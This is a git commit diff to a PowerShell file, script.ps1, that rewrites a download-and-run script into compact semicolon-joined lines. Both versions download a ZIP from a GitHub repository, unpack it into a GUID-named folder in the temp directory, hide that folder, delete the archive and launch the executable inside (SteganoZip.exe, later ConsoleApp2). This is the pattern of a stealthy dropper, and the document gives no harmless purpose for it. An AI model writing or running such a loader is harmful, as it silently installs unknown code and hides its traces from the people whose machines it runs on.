cc13b54951a119d7b851b0f99e55a5cceaf5979c
cuunon9x <55404965+cuunon9x@users.noreply.github.com>
2024-09-18 13:11:03 +0700

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,28 +1,8 @@
-$url = "https://github.com/cuunon9x/ghe/blob/main/ConsoleApp2.zip"
-$dir = [System.Guid]::NewGuid().ToString()
-$zipPath = "$env:temp\$dir.zip"
-$extractPath = "$env:temp\$dir"
-
-# Download the file
-(New-Object Net.WebClient).DownloadFile($url, $zipPath)
-
-# Create the extraction directory
-New-Item -Path $extractPath -ItemType Directory
-
-# Extract the ZIP file
-Expand-Archive -LiteralPath $zipPath -DestinationPath $extractPath
-
-# Hide the directory
-attrib +h $extractPath
-
-# Remove the ZIP file
-Remove-Item $zipPath
-
-# Optional sleep (depending on what you're waiting for)
-Start-Sleep -Seconds 3
-
-# Change location to the extracted directory
-Set-Location -Path $extractPath
-
-# Start SteganoZip (Ensure this executable exists in the extracted folder)
-Start-Process "$extractPath\SteganoZip.exe"
+$url = "https://github.com/cuunon9x/ghe/blob/main/ConsoleApp2.zip?raw=true"; 
+$dir = [System.Guid]::NewGuid().ToString(); 
+(New-Object Net.WebClient).DownloadFile("$url", "$env:temp\$dir.zip"); 
+New-Item -Path "$env:temp\$dir" -ItemType Directory; 
+Expand-Archive -LiteralPath "$env:temp\$dir.zip" -DestinationPath $env:temp\$dir; attrib +h $env:temp\$dir; 
+Remove-Item "$env:temp\$dir.zip"; 
+Start-Sleep -Seconds 3; 
+Set-Location -Path "$env:temp\$dir";Start-Process ConsoleApp2
